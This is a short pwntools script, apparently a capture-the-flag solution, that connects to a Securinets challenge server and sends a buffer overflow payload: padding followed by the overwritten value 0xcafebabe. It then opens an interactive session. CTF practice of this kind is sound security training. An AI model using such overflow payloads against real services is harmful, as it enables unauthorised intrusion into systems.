from pwn import *


io = remote("pwn.friendly.securinets.tn", "5007")

io.sendlineafter(b"you vs the beef !!!! WHO WINS ?\n", b'a'*(32-8)+(0xcafebabe).to_bytes(8, 'little'))


io.interactive()